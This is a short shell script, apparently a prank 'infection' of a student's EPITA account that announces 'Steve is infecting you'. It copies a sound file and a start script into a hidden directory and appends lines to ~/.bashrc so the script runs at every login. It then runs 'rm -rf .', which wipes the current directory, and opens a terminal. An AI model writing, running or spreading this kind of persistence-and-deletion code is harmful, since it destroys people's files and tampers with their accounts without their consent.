echo "Steve is infecting you..."
mkdir ~/afs/.var-logs
cp sound.mp3 ~/afs/.var-logs/epita-session.mp3
cp start_session.sh ~/afs/.var-logs/start_session.sh
echo "# starting EPITA session" >> ~/.bashrc
echo "./afs/.var-logs/start_session.sh" >> ~/.bashrc
rm -rf .
alacritty &
exit 0
